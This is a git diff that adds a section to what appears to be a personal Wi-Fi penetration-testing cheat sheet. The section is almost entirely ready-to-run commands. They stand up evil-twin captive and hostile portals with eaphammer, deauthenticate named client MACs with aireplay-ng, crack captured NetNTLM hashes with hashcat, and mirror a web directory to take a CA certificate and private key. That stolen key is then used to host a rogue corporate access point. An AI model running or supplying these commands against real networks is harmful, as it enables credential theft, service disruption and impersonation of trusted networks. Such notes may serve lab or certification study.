@@ -303,5 +303,65 @@
 1. Same step as above
 2. only change ssid in ``` wpa2-mgt-fake.conf ``` to the new target AP
 
-##
- 
+## WPA 2 MGT - Fake captive portal
+- attack client that associated to this network
+### [Option 1] Captive portal 
+- password will be plaintext
+1. Leverage eaphammer
+   ```
+   cd ~/tools/eaphammer
+   sudo killall dnsmasq
+   ./eaphammer --essid WiFi-Restaurant --interface wlan4 --captive-portal
+   ```
+2. [Shell 2] replay attack || choose -c station id that associated to your network
+   ```
+   iwconfig wlan0mon channel 44
+   aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
+   ```
+
+### [Option 2] Hostile portal
+- credential will be ntlm 
+1. Leverage eaphammer
+   ```
+   cd ~/tools/eaphammer
+   sudo killall dnsmasq
+   ./eaphammer --essid WiFi-Restaurant --interface wlan4 --hostile-portal
+   ```
+2. [Shell 2] replay attack || choose -c station id that associated to your network
+   ```
+   iwconfig wlan0mon channel 44
+   aireplay-ng -0 0 wlan0mon -a F0:9F:C2:71:22:17 -c 64:32:A8:BC:53:51
+   ```
+3. Hashcat the result (netntlm)
+   ```
+   hashcat -a 0 -m 5600 password.hash ~/rockyou-top100000.txt --force
+   ```
+
+### Exfiltrate CA cert for priviledge account
+1. locate the files 
+2. download all ``` wget -A txt -m -p -E -k -K -np  http://192.168.7.1/.internalCA/ ```
+3. You will need server.crt, ca.crt, server.key
+
+### [Option 3] Deauth attack (req getting files from another AP web server but same Channel)
+1. Import cert from above
+   ```
+   python3 /root/tools/eaphammer/eaphammer --cert-wizard import --server-cert ./server.crt --ca-cert ./ca.crt --private-key ./client.key --private-key-passwd xd12345
+   ```
+2. Host Rogue AP
+   ```
+   cd /root/tools/eaphammer
+   python3 ./eaphammer -i wlan4 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced
+   ```
+3 [Shells] 
+   ```
+   // for N of APs' bssid, cover all possible AP in the area to do replay 
+
+   airmon-ng start wlan1
+   iwconfig wlan1mon channel 44
+   aireplay-ng -0 0 -a F0:9F:C2:71:22:15 wlan1mon -c 64:32:A8:BA:6C:41
+
+
+   airmon-ng start wlan2
+   iwconfig wlan1mon channel 44
+   aireplay-ng -0 0 -a F0:9F:C2:71:22:1A wlan1mon -c 64:32:A8:BA:6C:41
+   ```
